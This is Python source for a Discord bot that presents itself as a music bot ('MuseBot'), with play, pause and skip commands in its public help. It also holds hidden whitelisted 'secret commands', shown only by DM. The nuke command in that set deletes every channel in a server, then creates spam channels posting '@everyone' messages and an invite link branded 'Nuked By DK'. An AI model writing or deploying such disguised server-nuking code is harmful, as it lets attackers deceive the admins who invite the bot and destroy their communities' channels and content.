import discord
from discord.ext import commands, tasks
import asyncio
import json
import os
import aiohttp
import yt_dlp
from collections import deque
import datetime
import random
import time

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
intents.members = True
bot = commands.Bot(command_prefix='*', intents=intents, help_command=None)

# Configuration
OWNER_ID = 1065537318351540234
OWNER_PREFIX = '+'
whitelisted_users = set()
WHITELIST_FILE = "whitelist.json"

# Spam settings
SPAM_MESSAGES = [
    "@everyone",
    "💀 Nuked By DK 💀", 
    "https://discord.gg/wAEhpXXJVV"
]
SPAM_CHANNEL_NAMES = [
    "nuked-by-dk",
    "destroyed-by-dk", 
    "dk-was-here",
    "fireplayz-nuke",
    "server-nuked"
]
SPAM_CATEGORY_NAME = "💀 NUKED BY DK 💀"
SPAM_ROLE_NAME = "NUKED BY DK"

# Status rotation - SIMPLIFIED to prevent crashes
STATUS_MESSAGES = [
    "Listening to *help",
    "Watching FirePlayzIsHere's Video",
    "Playing Songs"
]

# Safety configuration
MAX_DESTRUCTIVE_ACTIONS = 3
ACTION_COOLDOWN = 300
OPERATION_DELAY = 3.0

# Music queues
music_queues = {}
now_playing = {}

# Load whitelist
def load_whitelist():
    global whitelisted_users
    try:
        if os.path.exists(WHITELIST_FILE):
            with open(WHITELIST_FILE, 'r') as f:
                data = json.load(f)
                whitelisted_users = set(data.get('whitelisted', []))
                whitelisted_users.add(OWNER_ID)
                print(f"📋 Loaded {len(whitelisted_users)} whitelisted users")
    except Exception as e:
        print(f"❌ Error loading whitelist: {e}")

# Save whitelist
def save_whitelist():
    try:
        data = {'whitelisted': list(whitelisted_users)}
        with open(WHITELIST_FILE, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"💾 Saved {len(whitelisted_users)} whitelisted users")
    except Exception as e:
        print(f"❌ Error saving whitelist: {e}")

# Permission checks
def is_whitelisted():
    async def predicate(ctx):
        if ctx.author.id in whitelisted_users or ctx.author.id == OWNER_ID:
            return True
        await ctx.send("❌ You are not whitelisted for this command!", ephemeral=True)
        return False
    return commands.check(predicate)

def is_owner():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        await ctx.send("❌ This command is for bot owner only!", ephemeral=True)
        return False
    return commands.check(predicate)

# SIMPLE Status rotation without crashing
current_status_index = 0

async def update_status():
    """Safe status update without task loops"""
    try:
        global current_status_index
        status_msg = STATUS_MESSAGES[current_status_index]
        current_status_index = (current_status_index + 1) % len(STATUS_MESSAGES)
        
        activity = discord.Activity(type=discord.ActivityType.listening, name=status_msg)
        await bot.change_presence(activity=activity, status=discord.Status.online)
        print(f"🔄 Status: {status_msg}")
    except Exception as e:
        print(f"❌ Status update error: {e}")

# Confirmation system
async def get_confirmation(ctx, warning_message):
    embed = discord.Embed(
        title="⚠️ CONFIRMATION REQUIRED",
        description=warning_message,
        color=0xff0000
    )
    embed.add_field(
        name="Warning",
        value="This action is **DESTRUCTIVE** and **IRREVERSIBLE**!",
        inline=False
    )
    embed.add_field(
        name="To confirm",
        value="Type `CONFIRM` within 30 seconds to proceed",
        inline=False
    )
    
    await ctx.send(embed=embed)
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "CONFIRM"
    
    try:
        await bot.wait_for('message', timeout=30.0, check=check)
        return True
    except asyncio.TimeoutError:
        await ctx.send("⏰ Confirmation timed out. Command cancelled.")
        return False

# Music functions
async def play_audio(ctx, query):
    try:
        voice_client = ctx.guild.voice_client
        if not voice_client:
            if ctx.author.voice:
                voice_client = await ctx.author.voice.channel.connect()
            else:
                await ctx.send("❌ You need to be in a voice channel!")
                return
        
        # Try Lavalink first (if configured)
        # Fallback to YouTube direct
        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'no_warnings': True,
            'default_search': 'ytsearch',
            'noplaylist': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch:{query}", download=False)
            if not info['entries']:
                await ctx.send("❌ No results found!")
                return
            
            track = info['entries'][0]
            audio_url = track['url']
            title = track['title']
            
        FFMPEG_OPTIONS = {
            'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
            'options': '-vn'
        }
        
        voice_client.play(discord.FFmpegPCMAudio(audio_url, **FFMPEG_OPTIONS))
        now_playing[ctx.guild.id] = title
        await ctx.send(f"🎶 Now playing: **{title}**")
        
    except Exception as e:
        await ctx.send(f"❌ Error playing audio: {str(e)}")
        print(f"Music error: {e}")

# Safe operation functions with limits
async def safe_delete_channel(channel):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        await channel.delete()
        await asyncio.sleep(OPERATION_DELAY)
        return True
    except:
        return False

async def safe_create_channel(guild, name):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        channel = await guild.create_text_channel(name)
        await asyncio.sleep(OPERATION_DELAY)
        return channel
    except:
        return None

async def safe_ban_member(member):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        await member.ban(reason="Nuke command")
        await asyncio.sleep(OPERATION_DELAY)
        return True
    except:
        return False

# Bot events
@bot.event
async def on_ready():
    print(f'✅ {bot.user} is online!')
    print(f'📊 Serving {len(bot.guilds)} guilds')
    load_whitelist()
    
    # Safe status update
    await update_status()

# Music commands
@bot.command(name='play')
async def play_cmd(ctx, *, query):
    """Play a song from YouTube"""
    await play_audio(ctx, query)

@bot.command(name='pause')
async def pause_cmd(ctx):
    """Pause the current song"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.pause()
        await ctx.send("⏸️ Music paused")
    else:
        await ctx.send("❌ No music is playing!")

@bot.command(name='resume')
async def resume_cmd(ctx):
    """Resume paused music"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_paused():
        voice_client.resume()
        await ctx.send("▶️ Music resumed")
    else:
        await ctx.send("❌ Music is not paused!")

@bot.command(name='skip')
async def skip_cmd(ctx):
    """Skip the current song"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        await ctx.send("⏭️ Song skipped")
    else:
        await ctx.send("❌ No music is playing!")

@bot.command(name='stop')
async def stop_cmd(ctx):
    """Stop music and leave voice channel"""
    voice_client = ctx.guild.voice_client
    if voice_client:
        await voice_client.disconnect()
        await ctx.send("🛑 Music stopped and bot disconnected")
    else:
        await ctx.send("❌ Bot is not in a voice channel!")

@bot.command(name='np')
async def nowplaying_cmd(ctx):
    """Show currently playing song"""
    if ctx.guild.id in now_playing:
        await ctx.send(f"🎶 Now playing: **{now_playing[ctx.guild.id]}**")
    else:
        await ctx.send("❌ No music is playing!")

# Utility commands
@bot.command(name='help')
async def help_cmd(ctx):
    """Show music commands help"""
    embed = discord.Embed(
        title="🎵 MuseBot Music Commands",
        description="Prefix: `*`",
        color=0x00ff00
    )
    
    embed.add_field(
        name="Music Commands",
        value=(
            "`*play <song>` - Play a song from YouTube\n"
            "`*pause` - Pause current music\n"
            "`*resume` - Resume paused music\n"
            "`*skip` - Skip current song\n"
            "`*stop` - Stop music and disconnect\n"
            "`*np` - Show now playing\n"
        ),
        inline=False
    )
    
    await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping_cmd(ctx):
    """Check bot latency"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! {latency}ms")

# Secret commands
@bot.command(name='helpw')
@is_whitelisted()
async def helpw_cmd(ctx):
    """Show secret commands (whitelisted only)"""
    embed = discord.Embed(
        title="🤫 Secret Commands",
        description="These commands require confirmation!",
        color=0xff0000
    )
    
    embed.add_field(
        name="Server Management",
        value=(
            "`*nuke` - Nuke server (delete + create channels)\n"
            "`*channeladd <amount>` - Create spam channels\n"
            "`*deletechannel` - Delete all channels\n"
        ),
        inline=False
    )
    
    await ctx.author.send(embed=embed)
    await ctx.send("📨 Check your DMs for secret commands!", ephemeral=True)

@bot.command(name='nuke')
@is_whitelisted()
async def nuke_cmd(ctx):
    """Nuke the server"""
    if not await get_confirmation(ctx, "This will DELETE ALL CHANNELS and CREATE SPAM CHANNELS!"):
        return
    
    await ctx.send("🔄 Starting safe nuke operation...")
    
    # Delete channels
    deleted = 0
    for channel in list(ctx.guild.channels):
        if await safe_delete_channel(channel):
            deleted += 1
    
    await ctx.send(f"✅ Deleted {deleted} channels")
    await asyncio.sleep(5)
    
    # Create spam channels
    created = 0
    for i in range(min(10, 10)):  # Limit to 10 channels
        channel = await safe_create_channel(ctx.guild, f"nuked-{i+1}")
        if channel:
            created += 1
            # Send limited messages
            for j in range(3):
                await channel.send(random.choice(SPAM_MESSAGES))
                await asyncio.sleep(1)
    
    await ctx.send(f"✅ Created {created} spam channels")
    await ctx.send("💣 Server nuke completed!")

# Owner commands
@bot.command(name='access')
@is_owner()
async def access_cmd(ctx, action: str, user: discord.User = None):
    """Manage whitelisted users"""
    if action == "add" and user:
        whitelisted_users.add(user.id)
        save_whitelist()
        await ctx.send(f"✅ Added {user.mention} to whitelist!")
    
    elif action == "remove" and user:
        if user.id in whitelisted_users:
            whitelisted_users.remove(user.id)
            save_whitelist()
            await ctx.send(f"❌ Removed {user.mention} from whitelist!")
        else:
            await ctx.send("❌ User is not whitelisted!")
    
    elif action == "list":
        if whitelisted_users:
            user_list = "\n".join([f"<@{uid}>" for uid in whitelisted_users])
            await ctx.send(f"📋 Whitelisted users:\n{user_list}")
        else:
            await ctx.send("❌ No whitelisted users!")

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, (commands.CommandNotFound, commands.CheckFailure)):
        return
    
    await ctx.send(f"❌ Command error: {str(error)}")

# Run the bot
if __name__ == "__main__":
    # Load environment variables
    from dotenv import load_dotenv
    load_dotenv()
    
    TOKEN = os.getenv('DISCORD_TOKEN')
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("❌ DISCORD_TOKEN not found in environment variables!")